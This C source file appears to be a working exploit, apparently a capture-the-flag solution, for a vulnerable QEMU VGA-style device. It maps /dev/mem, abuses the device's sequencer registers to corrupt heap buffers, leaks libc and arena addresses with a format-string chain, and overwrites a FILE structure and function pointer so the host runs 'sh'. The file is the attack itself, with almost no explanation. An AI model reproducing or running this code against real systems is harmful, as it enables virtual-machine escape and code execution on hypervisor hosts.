#include <assert.h>
#include <stdint.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/io.h>

void *iomem;
char *cydf;
char tmp[8];

void die (const char* msg) {
  perror(msg);
  exit(-1);
}

void iowrite8(uint32_t offset, uint32_t value) {
  *((uint8_t*)(iomem + offset)) = value;
}

void iowrite16(uint32_t offset, uint32_t value) {
  *((uint16_t*)(iomem + offset)) = value;
}

void sr(uint32_t idx, uint32_t val) {
  sleep(0.5);
  iowrite8(0x3c4 - 0x3b0 - 0x10, idx);
  iowrite8(0x3c5 - 0x3b0 - 0x10, val);
}
void add(uint32_t size) {
  sr(0xcc, 0x00);
  sr(0xce, (size>>0x8) & 0xff);
  cydf[0x19000] = (size & 0xff);
}
void set(uint8_t idx, uint8_t val) {
  sr(0xcc, 0x01);
  sr(0xcd, idx);
  cydf[0x19000] = (val & 0xff);
}
void show(uint8_t idx) {
  sr(0xcc, 0x02);
  sr(0xcd, idx);
  cydf[0x19000] = 0x00;
}
void update(uint8_t idx, uint32_t size) {
  sr(0xcc, 0x03);
  sr(0xcd, idx);
  sr(0xce, (size >> 8) & 0xff);
  cydf[0x19000] = (size & 0xff);
}
void leak() {
  char *str = "%p %p %p %p %p %p %p %p %p %p %p %p %p\n";
  int len = strlen(str);
  for (int i = 0; i < len; i++) set(0x00, str[i]);
  show(0x0);  
}
int main (int argc, char *argv[]) {
  int fd;
  if(access("/dev/mem", 00)) system("mknod -m 660 /dev/mem c 1 1");
  int mem = open("/dev/mem", O_RDWR | O_SYNC);
  if(mem == -1) die("mem");

  iomem = mmap(0, 0x600, PROT_READ | PROT_WRITE, MAP_SHARED, mem, 0x00000000febc1000LL);
  if (iomem == MAP_FAILED) die("mmap error.");

  cydf = mmap(0, 0x20000, PROT_READ | PROT_WRITE, MAP_SHARED, mem, 0xa0000);
  if (cydf == MAP_FAILED) die("mmap error.");

  // avoid (s->vga.sr[0x07] & 0x01) == 0
  sr(0x07, 0x01);

  for (int i = 0; i < 0x11; i++) add(0x1000);
  // leak libc address & thread arena
  leak();

  char *hello = "hello world!\n";
  for (int i = 0; i < strlen(hello); i++) set(0x01, hello[i]);

  // set fp->_flags
  sleep(0.5);
  tmp[0x00] = cydf[0xf63e];
  sleep(0.5);
  tmp[0x00] = cydf[0xb620];
  char *sh = "\nhs;\xad\x22\x84";
  for (int i = 0; i < 3; i++) set(0x10, sh[3-i-1]);

  update(0x10, 0x300);

  sleep(0.5);
  tmp[0x00] = cydf[0xf63e];
  sleep(0.5);
  tmp[0x00] = cydf[0xb6f8];
  // system - 0x38
  unsigned char system[8] = "\x00\x00\x00\x00\x00\xee\x77\x38";
  for (int i = 0; i < 0x8; i++) set(0x10, system[7-i]);
  
  show(0x01);
  return 0;
}
